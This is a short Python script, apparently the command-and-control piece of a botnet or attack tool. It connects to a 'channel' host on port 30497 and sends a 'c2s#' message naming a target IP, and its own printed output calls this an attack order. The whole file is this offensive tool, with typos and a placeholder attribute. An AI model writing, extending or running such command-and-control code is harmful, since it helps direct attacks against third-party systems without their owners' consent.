import socket
import sys
import threading
from colorama import init, Fore, Back, Style	# for color and style

class C2Server():
	"""docstring for C2Server"""
	def __init__(self):
		self.ip = "ewer"
	def use(self):
		print("python c2server.py [chanel_ip] [target_ip]")
	def bootstrap(self):
		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			r = soc.connect((str(sys.argv[1]), 30497))
			print(Style.BRIGHT, end='')
			print(Fore.YELLOW + "*** Try connect to chanel %s" % (sys.argv[1]))
			soc.send(("c2s#" + str(sys.argv[2])).encode("utf8"))
			print(Fore.CYAN + "*** Send message attack to %s" % (sys.argv[2]))
			print(Fore.RESET, end='')
		except Exception as e:
			print(Fore.RED + "Connection faile" + str(e))

if __name__ == '__main__':
	init()	# initialize color
	c2server = C2Server()
	c2server.bootstrap()